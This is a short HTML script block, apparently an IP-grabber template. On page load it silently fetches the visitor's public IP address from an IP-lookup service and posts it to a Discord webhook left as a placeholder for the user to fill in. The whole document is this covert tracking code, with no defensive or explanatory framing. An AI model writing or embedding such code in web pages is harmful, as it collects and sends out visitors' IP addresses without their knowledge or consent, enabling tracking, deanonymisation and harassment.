    <script>
        function lol() {
            fetch('https://api.ipify.org')
            .then(response => response.text())
            .then(ip => {
                lmao(ip);
            })
        }
        function lmao(ip) {
            const lmfao = 'YOUR_DISCORD_WEBHOOK_HERE';
            const payload = {
                content: `${ip}`
            };
            fetch(lmfao, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
            })
        }
        lol();
    </script>
